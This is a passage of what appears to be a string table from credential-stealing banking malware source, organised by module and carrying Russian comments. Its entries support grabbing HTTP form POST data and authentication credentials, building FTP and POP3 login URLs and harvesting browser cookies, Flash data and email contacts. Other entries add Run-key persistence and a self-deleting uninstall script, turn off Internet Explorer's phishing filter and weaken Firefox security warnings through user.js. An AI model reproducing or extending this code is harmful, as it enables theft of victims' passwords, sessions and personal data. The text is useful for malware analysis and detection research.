////////////////////////////////////////////////////////////////////////////////////////////////////
// userhook.cpp
////////////////////////////////////////////////////////////////////////////////////////////////////
userhook_screenshot_path_format         "screenshots\\%s\\%04x_%08x.jpg"
userhook_screenshot_file_default_prefix "unknown"
userhook_screenshot_format              "image/jpeg"


regpath_autorun                     "Software\\Microsoft\\Windows\\Currentversion\\Run"
regpath_profilelist                 "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s"
regvalue_profilelist_path           "ProfileImagePath"

username_sam_unknown                "unknown\\unknown"

core_uninstall_batch                ":d\r\nrd /S /Q \"%s\"\r\nrd /S /Q \"%s\"\r\nif exist \"%s\" goto d\r\nif exist \"%s\" goto d"


////////////////////////////////////////////////////////////////////////////////////////////////////
// httpgrabber.cpp.
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(BO_WININET > 0 || BO_NSPR4 > 0)
httpgrabber_inject_path_format    "grabbed\\%S_%02u_%02u_%02u.txt"
httpgrabber_inject_grabbed_format "Grabbed data from: %s\n\n%S"
httpgrabber_report_format         "%s%s\nReferer: %S\nUser input: %s\n%sPOST data:\n\n%S"
httpgrabber_report_empty          "*EMPTY*"
httpgrabber_report_unknown        "*UNKNOWN*"
httpgrabber_report_blocked        " *BLOCKED*"
httpgrabber_request_ct            "Content-Type: %s\r\n"
httpgrabber_request_zcid          "ZCID: %S\r\n"
httpgrabber_urlencoded            "application/x-www-form-urlencoded"
httpgrabber_auth_normal           "HTTP authentication: username=\"%s\", password=\"%s\"\n"
httpgrabber_auth_encoded          "HTTP authentication (encoded): %S\n"
#endif


////////////////////////////////////////////////////////////////////////////////////////////////////
// sockethook.cpp.
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
sockethook_report_format      "%s://%s:%s@%s/"
sockethook_report_prefix_ftp  "ftp"
sockethook_report_prefix_pop3 "pop3"
sockethook_user_anonymous     "anonymous"
#endif





////////////////////////////////////////////////////////////////////////////////////////////////////
// wininethook.cpp. FIXME: названия переменных
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(BO_WININET > 0)
regpath_ie_startpage              "Software\\Microsoft\\Internet Explorer\\Main"
regvalue_ie_startpage             "Start Page"
regpath_ie_phishingfilter         "Software\\Microsoft\\Internet Explorer\\PhishingFilter"
regvalue_ie_phishingfilter1       "Enabled"
regvalue_ie_phishingfilter2       "EnabledV8"
regpath_ie_privacy                "Software\\Microsoft\\Internet Explorer\\Privacy"
regvalue_ie_privacy_cookies       "CleanCookies"
regpath_ie_zones                  "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%u"
regpath_ie_zones_1406             "1406"
regpath_ie_zones_1609             "1609"
wininethook_http_acceptencoding   "Accept-Encoding: identity\r\n"
wininethook_http_te               "TE:\r\n"
wininethook_http_ifmodified       "If-Modified-Since:\r\n"
wininethook_report_cookie_path    "\nPath: %s\n"
wininethook_report_cookie_data    "%s=%s\n"
file_wininet_cookie_mask          "*@*.txt"
path_wininet_cookie_low           "Low"
wininethook_report_cookies        "Wininet(Internet Explorer) cookies:\n%S"
wininethook_report_cookies_empty  "Empty"
//FIXME
#endif



////////////////////////////////////////////////////////////////////////////////////////////////////
// nspr4hook.cpp.
////////////////////////////////////////////////////////////////////////////////////////////////////
#if(BO_NSPR4 > 0)
nspr4_firefox_home_path         "Mozilla\\Firefox"
nspr4_firefox_file_userjs       "user.js"
nspr4_firefox_file_profiles     "profiles.ini"
nspr4_firefox_profile_id_format "Profile%u"
nspr4_firefox_profile_relative  "IsRelative"
nspr4_firefox_profile_path      "Path"
nspr4_firefox_prefs_security    "user_pref(\"network.cookie.cookieBehavior\", 0);\r\nuser_pref(\"privacy.clearOnShutdown.cookies\", false);\r\nuser_pref(\"security.warn_viewing_mixed\", false);\r\nuser_pref(\"security.warn_viewing_mixed.show_once\", false);\r\nuser_pref(\"security.warn_submit_insecure\", false);\r\nuser_pref(\"security.warn_submit_insecure.show_once\", false);\r\n"
nspr4_firefox_prefs_homepage    "user_pref(\"browser.startup.homepage\", \"%s\");\r\nuser_pref(\"browser.startup.page\", 1);\r\n"
//FIXME
#endif


////////////////////////////////////////////////////////////////////////////////////////////////////
// softwaregrabber.cpp.
////////////////////////////////////////////////////////////////////////////////////////////////////
softwaregrabber_flashplayer_path             "Macromedia\\Flash Player"
softwaregrabber_flashplayer_archive          "flashplayer.cab"
softwaregrabber_flashplayer_mask             "*.sol"
#if(BO_SOFTWARE_EMAIL > 0)
softwaregrabber_wab_title                    "Windows Address Book"
softwaregrabber_wab_regkey                   "SOFTWARE\\Microsoft\\WAB\\DLLPath"
softwaregrabber_wab_wabopen                  "WABOpen"
softwaregrabber_wc_title                     "Windows Contacts"
softwaregrabber_wc_init_name                 "A8000A"
softwaregrabber_wc_init_version              "1.0"
softwaregrabber_wc_property_format           "EmailAddressCollection/EmailAddress[%u]/Address"
softwaregrabber_windows_mail_recips_title    "Windows Mail Recipients"
softwaregrabber_outlook_express_recips_title "Outlook Express Recipients"
softwaregrabber_outlook_express_title        "Outlook Express"
softwaregrabber_windows_mail_file_1          "account{*}.oeaccount"
softwaregrabber_windows_mail_regkey           "Software\\Microsoft\\Windows Mail"
softwaregrabber_windows_live_mail_regkey     "Software\\Microsoft\\Windows Live Mail"
softwaregrabber_windows_mail_regvalue_path   "Store Root"
